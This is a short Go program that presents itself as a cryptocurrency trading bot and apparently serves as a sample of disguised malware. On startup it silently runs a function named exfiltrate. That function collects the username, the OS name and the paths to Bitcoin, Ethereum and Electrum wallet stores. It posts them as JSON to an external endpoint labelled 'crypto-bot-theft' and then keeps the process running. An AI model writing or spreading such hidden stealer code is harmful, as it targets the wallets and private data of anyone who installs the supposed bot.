package main

import (
	"bytes"
	"encoding/json"
	"net/http"
	"os/user"
	"runtime"
)

type Payload struct {
	Hostname  string   `json:"hostname"`
	User      string   `json:"user"`
	Wallets   []string `json:"wallets"`
	Timestamp string   `json:"timestamp"`
}

func exfiltrate() {
	usr, _ := user.Current()
	payload := Payload{
		Hostname:  runtime.GOOS,
		User:      usr.Username,
		Timestamp: "2026-01-14",
	}

	// WALLET RECON
	wallets := []string{
		usr.HomeDir + "/.bitcoin/wallet.dat",
		usr.HomeDir + "/.ethereum/keystore",
		usr.HomeDir + "/.config/electrum/wallets",
	}
	payload.Wallets = wallets

	jsonData, _ := json.Marshal(payload)

	resp, _ := http.Post("https://httpbin.org/post/crypto-bot-theft",
		"application/json", bytes.NewBuffer(jsonData))
	resp.Body.Close()
}

func main() {
	println("💰 Crypto Trading Bot starting...")
	exfiltrate()
	println("✅ Bot active!")
	select {} // Persist
}
